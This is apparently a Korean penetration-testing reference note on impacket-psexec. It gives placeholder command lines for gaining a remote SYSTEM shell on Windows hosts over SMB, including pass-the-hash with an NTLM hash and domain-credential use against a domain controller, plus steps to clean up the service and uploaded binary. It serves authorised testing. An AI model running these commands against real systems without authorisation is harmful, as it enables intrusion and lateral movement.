---
tags:
  - 환경/windows
  - 서비스/smb
  - 기능/원격실행
실행환경: ["Linux"]
필요권한: ["로컬 관리자 권한"]
필요조건: ["SMB 인증 정보 또는 hash", "ADMIN$ 접근과 서비스 생성 가능"]
결과: ["세션", "명령 실행"]
---

# impacket-psexec

## 도구 개요

`impacket-psexec`는 SMB의 ADMIN$ 공유와 Service Control Manager를 이용해 임시 서비스를 만들고 원격 명령 shell을 연다. Linux에서 관리자 자격 증명으로 서비스 기반 원격 실행이 필요할 때 사용하며, 대상에 서비스와 파일 흔적을 남기는 방식이다.

## 필요한 입력과 실행 환경

- 실행 위치: 대상 SMB/RPC TCP/445에 접근 가능한 Linux 호스트
- 필요한 입력: 대상 주소, 도메인/로컬 관리자 credential 또는 NTLM hash
- 대상 조건: `ADMIN$` 접근과 Service Control Manager를 통한 서비스 생성 권한이 필요하다.


## 표준 사용법

```bash
impacket-psexec <domain>/<user>:<password>@<target>
```

## 대표 예시

### NTLM hash로 SYSTEM shell 획득

실행 전에 기존에 없는 고유 서비스명과 원격 바이너리명을 정한다. 두 이름은 정상 종료와 비정상 종료 뒤 잔류 자원을 식별하는 기준이다.

```bash
impacket-psexec administrator@<TARGET> -hashes :<NTLM_HASH> -service-name <PSEXEC_SERVICE> -remote-binary-name <PSEXEC_REMOTE_BINARY>.exe
```

### 도메인 credential로 원격 명령 실행 세션 획득

```bash
impacket-psexec <DOMAIN>/<USER>:'<PASSWORD>'@<DC_HOST> -service-name <PSEXEC_SERVICE> -remote-binary-name <PSEXEC_REMOTE_BINARY>.exe
```

위 두 이름 지정 옵션은 현재 Fortra Impacket 구현 기준이다. 설치한 `impacket-psexec -h`에 옵션이 없으면 무작위 이름을 사용하는 구버전이므로 실행 출력에서 실제 서비스명·업로드 파일명을 확보하지 못한 상태로 복구 가능하다고 가정하지 않는다.

## 주요 옵션

| 옵션 | 설명 |
| --- | --- |
| `-hashes` | LM:NT hash로 인증 |
| `-k` | Kerberos 인증 사용 |
| `-no-pass` | 비밀번호 없이 Kerberos/ccache 사용 |
| `-dc-ip` | 도메인 컨트롤러 IP 지정 |
| `-target-ip` | 이름 해석과 별도 대상 IP 지정 |
| `-service-name` | 생성할 서비스 이름 지정 |
| `-remote-binary-name` | ADMIN$에 업로드할 원격 실행 파일 이름 지정 |

`-service-name`과 `-remote-binary-name`은 서로 다른 식별자다. 전자는 Service Control Manager 객체, 후자는 ADMIN$에 업로드되는 실행 파일 이름이다.


## 도구 고유 출력

| 출력/상태 | 의미 | 다음 행동 |
|---|---|---|
| command output 또는 shell 획득 | Windows 원격 명령 실행 성공 | `whoami`, `hostname`, `ipconfig`로 컨텍스트 확인 |
| service 생성/실행 로그 | 관리자 권한으로 실행 경로 접근 | AV/EDR, 서비스 cleanup, 파일 쓰기 가능 경로 확인 |
| `STATUS_ACCESS_DENIED` | 관리자 권한 부족 또는 UAC 제한 | 로컬 관리자 여부, admin share 접근, UAC remote restriction 확인 |
| logon/network 오류 | credential, SMB/RPC/SCM 접근 문제 | 포트, 계정 형식, NTLM/Kerberos, 방화벽 확인 |
| 명령 실행 실패 | Service Control Manager/SMB/RPC 제한 | 445 접근성, admin share, 서비스 생성 권한, AV/EDR 확인 |
| 출력 없음 | 실행은 됐지만 stdout 회수 실패 | 파일로 출력 저장, 다른 exec 방식, 방화벽 확인 |

## 변경 영향과 복구

`impacket-psexec`는 `<PSEXEC_SERVICE>`와 `ADMIN$\<PSEXEC_REMOTE_BINARY>.exe`를 만들고 정상 종료·예외 처리에서 제거를 시도한다. 실행 전 같은 이름의 서비스와 파일이 없음을 확인하고, 도구 출력의 생성·제거 결과를 기록한다. 자동 정리 실패가 확인된 경우에만 아래 exact 식별자를 사용한다.

Linux 공격 호스트에서 서비스 상태를 확인하고, 남아 있으면 중지한 뒤 삭제한다.

```bash
impacket-services <USER>@<TARGET> -hashes :<NTLM_HASH> status -name <PSEXEC_SERVICE>
impacket-services <USER>@<TARGET> -hashes :<NTLM_HASH> stop -name <PSEXEC_SERVICE>
impacket-services <USER>@<TARGET> -hashes :<NTLM_HASH> delete -name <PSEXEC_SERVICE>
impacket-services <USER>@<TARGET> -hashes :<NTLM_HASH> status -name <PSEXEC_SERVICE>
```

첫 status가 서비스 없음이면 stop·delete를 실행하지 않는다. 마지막 status가 서비스 없음이어야 서비스 정리가 끝난 것이다. 업로드 파일은 같은 인증 자료로 ADMIN$만 열고 exact 파일명을 확인해 제거한다.

```text
$ impacket-smbclient <USER>@<TARGET> -hashes :<NTLM_HASH>
# use ADMIN$
# ls <PSEXEC_REMOTE_BINARY>.exe
# rm <PSEXEC_REMOTE_BINARY>.exe
# ls <PSEXEC_REMOTE_BINARY>.exe
# exit
```

마지막 `ls`에서 파일이 없어야 원격 파일 정리가 끝난 것이다. 이름이 실행 전에 존재했거나 이 실행의 생성물인지 확인할 수 없으면 삭제하지 않는다. shell에서 실행한 명령이 만든 파일·계정·설정과 대상 감사 기록은 별도 영향이다.

## 관련 공격기법

- [[Pass the Hash]]
- [[Pass the Ticket]]

## 참고 링크

- [Fortra Impacket: psexec implementation](https://github.com/fortra/impacket/blob/master/examples/psexec.py)
- [Fortra Impacket: services implementation](https://github.com/fortra/impacket/blob/master/examples/services.py)
- [Fortra Impacket: smbclient implementation](https://github.com/fortra/impacket/blob/master/impacket/examples/smbclient.py)
